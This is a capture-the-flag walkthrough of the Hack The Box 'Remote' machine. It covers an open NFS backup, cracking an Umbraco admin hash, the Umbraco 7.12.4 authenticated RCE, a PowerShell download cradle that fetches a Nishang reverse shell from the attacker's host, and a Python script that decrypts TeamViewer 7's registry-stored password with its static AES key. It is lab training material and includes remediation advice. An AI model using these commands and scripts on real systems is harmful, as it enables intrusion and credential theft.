# Remote — an NFS backup leaks the CMS, and TeamViewer keeps the admin password

[![Difficulty](https://img.shields.io/badge/difficulty-Easy-green)](https://app.hackthebox.com/machines/remote)
[![OS](https://img.shields.io/badge/OS-Windows-blue)](https://app.hackthebox.com/machines/remote)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=iyYqgseKUPM)

> **Attack path:** world-readable NFS export `/site_backups` → `Umbraco.sdf` SHA1 hash →
> rockyou crack → Umbraco 7.12.4 authenticated RCE → shell as `iis apppool\defaultapppool`
> → TeamViewer 7 password in registry (static-key AES) → decrypt → Administrator over
> WinRM/PSExec.

Credentials and flags are intentionally redacted as `<password>` / `<flag>` / `<hash>` —
you should recover them yourself while working the box.

## 1 · Reconnaissance

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.180
nmap -sV -sC -p 21,80,111,135,139,445,2049,5985,47001 -oA scans/nmap-tcpscripts 10.10.10.180
```

```text
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

- Port 80 serves an "Acme Widgets" site whose source references **Umbraco CMS**, with the
  admin panel at `/umbraco` (default creds fail).
- FTP allows anonymous login but the root is empty and not writable.
- SMB null-session enumeration is denied (`smbclient -N -L //10.10.10.180`).

### NFS — TCP 2049

NFS on a Windows box is unusual and immediately interesting:

```bash
showmount -e 10.10.10.180
```

```text
Export list for 10.10.10.180:
/site_backups (everyone)
```

Mount it:

```bash
mkdir /mnt/remote
mount -t nfs 10.10.10.180:/site_backups /mnt/remote
ls /mnt/remote
```

```text
App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx
Global.asax   Media     scripts      Umbraco        Umbraco_Client  Views  Web.config
```

This is a full backup of the web root.

## 2 · Foothold

### Extract credentials from Umbraco.sdf

```bash
cd /mnt/remote/App_Data
strings Umbraco.sdf | head
```

Among the first strings are the CMS user records:

```text
admin admin@htb.local <hash> {"hashAlgorithm":"SHA1"}
smith smith@htb.local ... {"hashAlgorithm":"HMACSHA256"}
```

The `admin` account has an unsalted **SHA1** hash. Crack it:

```bash
echo '<hash>' > admin.sha1
hashcat -m 100 admin.sha1 /usr/share/wordlists/rockyou.txt
```

It falls to rockyou quickly → `<password>`.

### Log in to Umbraco

At `http://10.10.10.180/umbraco`, the login is `admin@htb.local` (the full email, not
`admin`) with the cracked password.

### Authenticated RCE in Umbraco 7.12.4

This version has a public authenticated code-execution PoC (Exploit-DB 46153): it sends an
XSLT payload containing an inline C# script that runs `System.Diagnostics.Process`.
Customize three variables in the exploit:

```python
login    = "admin@htb.local"
password = "<password>"
host     = "http://10.10.10.180"
```

and in the XSLT payload switch `calc.exe` to `cmd.exe` with a controllable argument:

```python
string cmd = "/c ping <tun0-ip>";
```

Run the exploit with `tcpdump -i tun0 icmp` listening — ICMP echo replies confirm RCE.

### Shell as the app pool identity

Replace the ping with a PowerShell download cradle for a Nishang reverse shell:

```python
string cmd = "/c powershell -c iex(new-object net.webclient).downloadstring('http://<tun0-ip>/shell.ps1')";
```

Prepare `shell.ps1` (Invoke-PowerShellTcp.ps1 with a trailing call to
`Invoke-PowerShellTcp -Reverse -IPAddress <tun0-ip> -Port 443`), serve it with
`python3 -m http.server 80`, and catch the callback:

```bash
rlwrap nc -lvnp 443
```

```text
Windows PowerShell running as user REMOTE$ on REMOTE
PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
```

## 3 · User flag

There are no regular user profiles on this host — `dir C:\Users` shows only service
accounts plus `Administrator` and `Public`. The user flag sits in the Public profile:

```text
PS C:\users\Public> type user.txt
<flag>
```

## 4 · Privilege escalation

### Spot TeamViewer

```text
PS C:\> tasklist | findstr TeamViewer
TeamViewer_Service.exe    3108 ... 18,392 K
```

`C:\Program Files (x86)\TeamViewer\Version7` shows **TeamViewer 7.0.43148** — a remote
access tool whose server stores an unattended-access password. TeamViewer 7 encrypts it
with AES-128-CBC using a **hard-coded static key and IV** (the same ones implemented in
the Metasploit module `post/windows/gather/credentials/teamviewer_passwords`).

### Read the encrypted password from the registry

```powershell
cd HKLM:\software\wow6432node\teamviewer\version7
(get-itemproperty -path .).SecurityPasswordAES
```

```text
255
155
28
115
...
```

### Decrypt offline

```python
#!/usr/bin/env python3
from Crypto.Cipher import AES

key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
iv  = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174,
                    19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218,
                    126, 141, 55, 107, 38, 57, 78, 91])

aes = AES.new(key, AES.MODE_CBC, IV=iv)
password = aes.decrypt(ciphertext).decode("utf-16").rstrip("\x00")
print(f"[+] Found password: {password}")
```

The plaintext is the TeamViewer unattended-access password (`<password>`), which has been
reused for the local Administrator account. Validate before using it:

```bash
crackmapexec smb 10.10.10.180 -u administrator -p '<password>'
```

```text
SMB  10.10.10.180  445  REMOTE  [+] REMOTE\administrator:<password> (Pwn3d!)
```

## 5 · Root flag / Domain Admin

WinRM (5985) is open, so any of the standard remote-execution tools works:

```bash
evil-winrm -u administrator -p '<password>' -i 10.10.10.180
# or
psexec.py 'administrator:<password>@10.10.10.180'   # gives NT AUTHORITY\SYSTEM
wmiexec.py 'administrator:<password>@10.10.10.180'
```

```text
*Evil-WinRM* PS C:\Users\Administrator\desktop> whoami
remote\administrator
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
<flag>
```

## 6 · Impact & remediation

| Risk | Impact | Remediation |
| --- | --- | --- |
| NFS export `/site_backups` readable by everyone | Anonymous attackers obtain the full web root including the CMS database and password hashes | Remove the export or restrict it by IP; never expose backups on NFS without auth |
| CMS admin password present in rockyou | Umbraco admin access leads directly to authenticated RCE | Enforce long random passwords and MFA on CMS accounts |
| Umbraco 7.12.4 with a known authenticated RCE | Any low-priv CMS session becomes code execution as the app pool identity | Upgrade Umbraco; treat authenticated users as a trust boundary |
| TeamViewer 7 stores the unattended-access password with a static, public AES key | Any shell on the host recovers the Administrator password | Remove legacy remote-access tools; upgrade to versions that use DPAPI/OS-protected storage |
| Password reuse (TeamViewer ↔ Administrator) | Single secret yields full system compromise | Unique per-service credentials, stored in a proper secrets manager |

## 7 · CPTS takeaways

- **NFS is a Windows recon item too**: `showmount -e` costs seconds and here hands over
  the application's database. Check 2049/tcp on every box, any OS.
- Backups of application state (`.sdf`, `.bak`, dumps) are prime credential sources —
  `strings` is often enough when you cannot parse the format.
- Authenticated RCE is still RCE: knowing one CMS password chain (SHA1 crack → XSLT/C#
  injection PoC) covers many real engagements with outdated CMS installs.
- Third-party remote-access software (TeamViewer, VNC, RDP managers) is a standard
  post-exploation credential store — memorize the TeamViewer registry path
  (`HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7`, `SecurityPasswordAES`).
- Validate recovered credentials with `crackmapexec` before pivoting, then select the
  shell type by open ports: WinRM → `evil-winrm`/`wmiexec`, SMB → `psexec` for SYSTEM.
